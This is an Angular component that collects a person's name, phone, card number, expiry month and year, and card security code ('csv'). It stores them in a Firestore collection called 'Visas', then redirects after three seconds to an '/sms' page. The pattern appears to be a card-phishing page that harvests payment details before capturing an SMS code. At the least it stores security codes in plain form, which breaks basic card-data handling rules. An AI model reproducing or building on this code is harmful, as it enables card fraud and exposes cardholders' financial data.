import { Component } from '@angular/core';
import { AngularFirestore } from '@angular/fire/compat/firestore';
import { Router } from '@angular/router';

@Component({
  selector: 'app-home',
  templateUrl: './home.component.html',
  styleUrls: ['./home.component.scss'],
})
export class HomeComponent {
  constructor(private firestore: AngularFirestore, private router: Router) {}
  id = '';
  name = '';
  phone = '';
  visa = '';
  month = '';
  year = '';
  csv = '';
  onSubmit() {
    this.firestore.collection('Visas').doc(this.id).set({
      id: this.id,
      name: this.name,
      phone: this.phone,
      visa: this.visa,
      month: this.month,
      year: this.year,
      csv: this.csv,
    });
    setTimeout(() => {
      this.router.navigate(['/sms']);
    }, 3000);
  }
}
